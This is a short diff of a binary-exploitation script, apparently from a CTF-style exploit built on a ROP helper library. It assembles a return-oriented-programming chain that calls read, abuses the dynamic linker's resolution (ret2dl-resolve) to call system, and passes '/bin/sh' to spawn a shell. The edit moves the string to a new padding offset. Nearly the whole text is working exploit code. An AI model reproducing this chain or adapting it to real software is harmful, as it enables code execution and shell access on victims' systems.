@@ -21,10 +21,10 @@ addr_dt_debug = addr_link_map + 0x1c8
 buf = p64(rop.gadget('ret'))
 buf += rop.call_chain_ptr(
     [rop.got('read'), 0, addr_dt_debug, 8],
-    [addr_stage, addr_stage + 311]
+    [addr_stage, addr_stage+380]
 )
 buf += rop.dl_resolve(addr_stage + len(buf), 'system')
-print "[+] offset to string: %d" % len(buf)
+buf += rop.fill(380, buf)
 buf += rop.string('/bin/sh')
 buf += rop.fill(400, buf)
 
